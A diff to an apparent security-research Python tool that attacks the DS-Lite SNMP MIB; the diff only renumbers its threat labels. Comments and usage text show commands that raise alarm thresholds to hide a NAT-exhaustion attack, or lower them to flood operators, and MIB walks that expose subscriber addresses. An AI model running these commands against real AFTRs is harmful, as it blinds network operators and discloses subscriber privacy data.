@@ -1,6 +1,6 @@
 #!/usr/bin/python
-# T10 – SNMP Threshold Manipulation (Alarm Suppression / Alarm Flooding)
-# T11 – MIB Information Disclosure
+# T12 – SNMP Threshold Manipulation (Alarm Suppression / Alarm Flooding)
+# T5 – MIB Information Disclosure
 #
 # RFC 7870 defines the DSLITE-MIB (IANA mib-2.240 = 1.3.6.1.2.1.240)
 # with three subtrees: dsliteTunnel, dsliteNAT, dsliteInfo.
@@ -19,13 +19,13 @@
 #
 # Attackers with SNMP write access (or default community strings) can:
 #
-#   T10 – MANIPULATION:
+#   T12 – MANIPULATION:
 #     a) Suppress alarms: set ConnectNumber to max → AFTR never triggers alerts
 #        during concurrent attacks (T1 NAT exhaustion goes unnoticed by NOC)
 #     b) Generate alarm floods: set thresholds to 0 → constant alerts
 #        cause operator desensitization, masking real attacks
 #
-#   T11 – DISCLOSURE:
+#   T5 – DISCLOSURE:
 #     a) Walk dsliteTunnelTable → reveals B4 IPv6 addresses, tunnel names,
 #        subscriber topology, prefix lengths, encapsulation type
 #     b) Walk dsliteNATBindTable → reveals active subscriber sessions,
@@ -46,17 +46,17 @@
 # compromise required). A subscriber's route to 10.99.0.1 goes through the DS-Lite
 # softwire, so its SNMP is encapsulated (outer IPv6 proto-4) and bypasses the
 # eth-isp/eth-wan udp/161 ACLs; the AFTR decapsulates it and the inner udp/161
-# reaches the agent. Verified: pcaps/per_attack/T11/T15_3 (LAN) + T15_4 (tunnel).
+# reaches the agent (verified from both the subscriber-LAN (P1) and tunnel capture points).
 #
 # Usage:
-#   # T11 – read MIB tables:
+#   # T5 – read MIB tables:
 #   python3 snmp_attack.py read --target 127.0.0.1 --oids tunnel,nat,thresholds
 #
-#   # T10 – suppress alarms:
+#   # T12 – suppress alarms:
 #   python3 snmp_attack.py set --target 127.0.0.1 \
 #       --oid alarmConnectNumber --value 4294967295
 #
-#   # T10 – generate alarm flood:
+#   # T12 – generate alarm flood:
 #   python3 snmp_attack.py set --target 127.0.0.1 \
 #       --oid alarmConnectNumber --value 0
 import argparse
@@ -416,7 +416,7 @@ def parse_oid_arg(oid_str):
 
 def main():
     p = argparse.ArgumentParser(
-        description="T10/T11 – SNMP Threshold Manipulation and MIB Disclosure\n"
+        description="T12/T5 – SNMP Threshold Manipulation and MIB Disclosure\n"
                     "Targets the RFC 7870 DSLITE-MIB (IANA mib-2.240) on the AFTR.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
@@ -449,7 +449,7 @@ RFC 7870 DSLITE-MIB structure (IANA OID 1.3.6.1.2.1.240):
 OID groups for --oids:
   tunnel, nat, thresholds, alarms, statistics, system, all
 
-T10 – Alarm manipulation examples:
+T12 – Alarm manipulation examples:
   # Suppress all alarms (set tunnel threshold to max → NOC blind to T1 attack):
   python3 snmp_attack.py set --target 127.0.0.1 \\
       --oid alarmConnectNumber --value 4294967295
@@ -462,7 +462,7 @@ T10 – Alarm manipulation examples:
   python3 snmp_attack.py set --target 127.0.0.1 \\
       --oid alarmPortNumber --value 0
 
-T11 – Disclosure examples:
+T5 – Disclosure examples:
   # Enumerate tunnel topology (subscriber B4 IPv6 addresses):
   python3 snmp_attack.py read --target 127.0.0.1 --oids tunnel
 
@@ -493,7 +493,7 @@ T11 – Disclosure examples:
                    help='Integer value to SET')
     args = p.parse_args()
 
-    print(f"[*] T10/T11 – SNMP Attack on DS-Lite AFTR")
+    print(f"[*] T12/T5 – SNMP Attack on DS-Lite AFTR")
     print(f"[*] Target: {args.target}:{args.port}  Community: {args.community}")
     print(f"[*] MIB: DSLITE-MIB (RFC 7870, IANA mib-2.240)")
     print()
@@ -505,7 +505,7 @@ T11 – Disclosure examples:
             p.error('--value required for set action')
         oid = parse_oid_arg(args.oid)
         oid_str_display = '.'.join(map(str, oid))
-        print(f"[*] T10 – Setting {args.oid} ({oid_str_display}) = {args.value}")
+        print(f"[*] T12 – Setting {args.oid} ({oid_str_display}) = {args.value}")
         err, oid_resp, val = snmp_set(args.target, args.port, args.community, oid, args.value)
         if err == 0:
             print(f"[+] SET successful: {oid_resp} = {val}")
@@ -515,7 +515,7 @@ T11 – Disclosure examples:
             print(f"[!] {val}")
         print()
 
-        # T10 impact analysis
+        # T12 impact analysis
         oid_name = args.oid
         if oid_name in OID_ALIASES:
             oid_name = OID_ALIASES[oid_name]
@@ -527,25 +527,25 @@ T11 – Disclosure examples:
         if oid_name == 'alarmConnectNumber' and args.value >= INT32_MAX:
             _rb_err, _rb_oid, _rb_val = snmp_get(args.target, args.port,
                                                  args.community, oid)
-            print("[!] T10 alarm SUPPRESSION active:")
+            print("[!] T12 alarm SUPPRESSION active:")
             print(f"    dsliteAFTRAlarmConnectNumber now = {_rb_val} "
                   f"(Integer32 max {INT32_MAX}); the tunnel-count alarm can never trip")
             print("    → dsliteTunnelNumAlarm will NEVER fire")
             print("    → Run T1 NAT exhaustion concurrently – NOC blind to attack")
         elif oid_name == 'alarmConnectNumber' and args.value == 0:
-            print("[!] T10 alarm FLOOD active:")
+            print("[!] T12 alarm FLOOD active:")
             print("    dsliteAFTRAlarmConnectNumber set to 0")
             print("    → dsliteTunnelNumAlarm fires constantly")
             print("    → Operator desensitization – real attacks masked by noise")
         elif oid_name == 'alarmSessionNumber' and args.value >= 0:
-            print(f"[!] T10: dsliteAFTRAlarmSessionNumber set to {args.value}")
+            print(f"[!] T12: dsliteAFTRAlarmSessionNumber set to {args.value}")
             if args.value == 0:
                 print("    → dsliteAFTRUserSessionNumAlarm fires constantly (alarm flood)")
             else:
                 print("    → Notification fires when sessions > this threshold")
             print("    Default was -1 (disabled). Attacker enabled/changed the alarm.")
         elif oid_name == 'alarmPortNumber' and args.value >= 0:
-            print(f"[!] T10: dsliteAFTRAlarmPortNumber set to {args.value}")
+            print(f"[!] T12: dsliteAFTRAlarmPortNumber set to {args.value}")
             if args.value == 0:
                 print("    → dsliteAFTRPortUsageOfSpecificIpAlarm fires constantly")
             else:
@@ -563,7 +563,7 @@ T11 – Disclosure examples:
             else:
                 oid_names.append(part)
 
-        print(f"[*] T11 – MIB Information Disclosure: querying {len(oid_names)} OIDs")
+        print(f"[*] T5 – MIB Information Disclosure: querying {len(oid_names)} OIDs")
         print(f"[*] RFC 7870 §7: 'Unauthorized read access violates subscriber privacy'")
         print()
 
@@ -591,7 +591,7 @@ T11 – Disclosure examples:
 
         print()
         if found_sensitive:
-            print(f"[!] T11 – {len(found_sensitive)} sensitive values disclosed:")
+            print(f"[!] T5 – {len(found_sensitive)} sensitive values disclosed:")
             for name, val in found_sensitive:
                 if 'tunnel' in name.lower():
                     if 'StartAddr' in name:
@@ -610,7 +610,7 @@ T11 – Disclosure examples:
                 elif 'stats' in name.lower():
                     print(f"  {name}: {val}  ← Traffic statistics")
                 elif 'alarm' in name.lower():
-                    print(f"  {name}: {val}  ← Alarm config (aids T10 manipulation)")
+                    print(f"  {name}: {val}  ← Alarm config (aids T12 manipulation)")
             print()
             print("RFC 7870 Section 7 warnings:")
             print("  'Various objects can reveal the identity of private hosts'")
@@ -621,7 +621,7 @@ T11 – Disclosure examples:
             print("  access needed). A subscriber's route to the OAM IP goes through")
             print("  the DS-Lite softwire, so its SNMP is encapsulated and bypasses")
             print("  data-plane interface ACLs; after decap it reaches the agent.")
-            print("  -> raises T11 from P3 (operator OAM) to P1 (malicious customer).")
+            print("  -> raises T5 from P3 (operator OAM) to P1 (malicious customer).")
             print()
             print("Mitigation:")
             print("  - Implementations MUST include full SNMPv3 USM with AES")
